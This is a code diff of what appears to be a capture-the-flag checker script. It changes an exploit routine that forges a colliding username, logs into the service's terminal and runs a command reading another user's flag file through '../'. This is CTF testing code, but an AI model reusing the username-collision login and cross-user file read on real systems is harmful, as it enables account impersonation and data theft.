@@ -1,4 +1,5 @@
 import secrets
+import re
 from logging import LoggerAdapter
 
 from enochecker3.chaindb import ChainDB
@@ -16,6 +17,7 @@ from enochecker3.utils import FlagSearcher, assert_equals
 from httpx import AsyncClient
 import base64
 
+from exploit import exploit0_apply_delta
 from noise import get_noise, get_random_noise
 from util import (
     create_terminal,
@@ -66,7 +68,9 @@ async def getflag0(
 ) -> None:
     (username, password, port) = await user_login(client, db, logger)
     pid = await create_terminal(client, logger, username, password)
-    flag = base64.b64encode(bytes(task.flag, "utf-8")).decode("utf-8").replace('+', '\\+')
+    flag = (
+        base64.b64encode(bytes(task.flag, "utf-8")).decode("utf-8").replace("+", "\\+")
+    )
     try:
         await terminal_websocket(
             task.address,
@@ -86,7 +90,6 @@ async def getflag0(
 @checker.exploit(0)
 async def exploit0(
     task: ExploitCheckerTaskMessage,
-    searcher: FlagSearcher,
     client: AsyncClient,
     logger: LoggerAdapter,
 ):
@@ -97,37 +100,38 @@ async def exploit0(
 
     logger.info("Exploit: " + target_username)
 
-    response = await client.post(
-        "http://cafedodo-crc32:3333",
-        content=target_username,
-        follow_redirects=True,
-    )
+    if len(target_username) != 60:
+        raise MumbleException("Incorrect attack_info username length")
 
-    username = response.text
+    delta_username = exploit0_apply_delta(target_username)
 
-    if response.text == "":
-        raise MumbleException("No CRC32 match")
-
-    logger.info("Brute-forced username: " + username)
+    logger.info("Delta username: " + delta_username)
 
     password = secrets.token_hex(30)
 
-    port = await do_user_login(client, logger, username, password)
-    pid = await create_terminal(client, logger, username, password)
+    port = await do_user_login(client, logger, delta_username, password)
+    pid = await create_terminal(client, logger, delta_username, password)
     response = await terminal_websocket(
         task.address,
         logger,
-        username,
+        delta_username,
         password,
         port,
         pid,
         [
-            (f"cat ../{target_username}/flagstore.txt\n", ".*ENOFLAGENOFLAG=.*"),
+            (
+                f"echo FLAG && cat ../{target_username}/flagstore.txt && echo OK\n",
+                ".*\nOK.*",
+            ),
         ],
     )
 
-    if flag := searcher.search_flag(response):
-        return flag
+    match = re.findall(r"FLAG\s*([A-Za-z0-9\+\=]+)\s*OK", response)
+    if len(match) == 0:
+        return None
+
+    flag = base64.b64decode(match[0]).decode("utf-8")
+    return flag
 
 
 @checker.putnoise(0)
